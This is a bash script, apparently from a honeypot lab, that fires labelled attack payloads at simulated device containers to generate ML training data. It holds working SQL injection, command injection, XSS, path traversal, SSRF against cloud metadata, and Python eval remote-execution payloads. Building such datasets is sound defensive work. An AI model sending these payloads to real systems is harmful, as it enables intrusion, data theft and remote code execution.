#!/usr/bin/env bash
# =============================================================================
# Computer 3 — 09_custom_payloads.sh
# Delivers a curated list of malicious payloads across all HTTP containers so
# the ML dataset has rich examples of every attack class.
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a
HOST="${HONEYPOT_HOST:-192.168.1.10}"
OUT="results/09_custom_payloads"
mkdir -p results

deliver() {
  local label="$1" url="$2"
  echo "[$label] $url" | tee -a "${OUT}.log"
  curl -s -o /dev/null -w "  HTTP %{http_code}  %{size_download}B\n" --max-time 3 "$url" | tee -a "${OUT}.log"
}

# SQLi variants
deliver sqli_tautology         "http://${HOST}:${HTTP_PORT:-8080}/login?u=admin'%20OR%201=1--&p=x"
deliver sqli_union_string      "http://${HOST}:${HTTP_PORT:-8080}/product?id=1%20UNION%20SELECT%20user,pass,1%20FROM%20users"
deliver sqli_blind_sleep       "http://${HOST}:${HTTP_PORT:-8080}/product?id=1;SELECT%20SLEEP(3)--"
deliver sqli_error_based       "http://${HOST}:${HTTP_PORT:-8080}/product?id='"

# Command injection variants
deliver cmdi_semicolon         "http://${HOST}:${HTTP_PORT:-8080}/api/ping?host=127.0.0.1;id"
deliver cmdi_pipe              "http://${HOST}:${HTTP_PORT:-8080}/api/ping?host=127.0.0.1|id"
deliver cmdi_and               "http://${HOST}:${HTTP_PORT:-8080}/api/ping?host=127.0.0.1&&id"
deliver cmdi_subshell          "http://${HOST}:${HTTP_PORT:-8080}/api/ping?host=\$(id)"
deliver cmdi_backtick          "http://${HOST}:${HTTP_PORT:-8080}/api/ping?host=%60id%60"

# XSS variants
deliver xss_script             "http://${HOST}:${HTTP_PORT:-8080}/search?q=<script>alert(1)</script>"
deliver xss_img_onerror        "http://${HOST}:${HTTP_PORT:-8080}/search?q=<img%20src=x%20onerror=alert(1)>"
deliver xss_svg                "http://${HOST}:${HTTP_PORT:-8080}/search?q=<svg/onload=alert(1)>"

# Path traversal variants
deliver traversal_unix         "http://${HOST}:${CAMERA_PORT:-8081}/admin?file=../../etc/passwd"
deliver traversal_win          "http://${HOST}:${NAS_PORT:-8086}/api/files?path=..\\..\\windows\\win.ini"
deliver traversal_encoded      "http://${HOST}:${CAMERA_PORT:-8081}/admin?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# SSRF
deliver ssrf_localhost         "http://${HOST}:${SMARTTV_PORT:-8083}/cast?url=http://127.0.0.1:9200/"
deliver ssrf_file              "http://${HOST}:${SMARTTV_PORT:-8083}/cast?url=file:///etc/passwd"
deliver ssrf_metadata          "http://${HOST}:${SMARTTV_PORT:-8083}/cast?url=http://169.254.169.254/latest/meta-data/"

# RCE via eval on microwave
deliver rce_eval_import        "http://${HOST}:${MICROWAVE_PORT:-8082}/cook?program=__import__('os').popen('id').read()"
deliver rce_eval_popen         "http://${HOST}:${MICROWAVE_PORT:-8082}/cook?program=__import__('subprocess').check_output('id',shell=True)"

# Recon
deliver recon_config           "http://${HOST}:${ROUTER_PORT:-8085}/api/config"
deliver recon_share            "http://${HOST}:${NAS_PORT:-8086}/api/share"
deliver recon_status           "http://${HOST}:${PRINTER_WEB_PORT:-8087}/status"

# Implant / upload
deliver upload_implant         "http://${HOST}:${HTTP_PORT:-8080}/upload"

echo ""
echo "[+] Done. Full log: results/${OUT}.log"
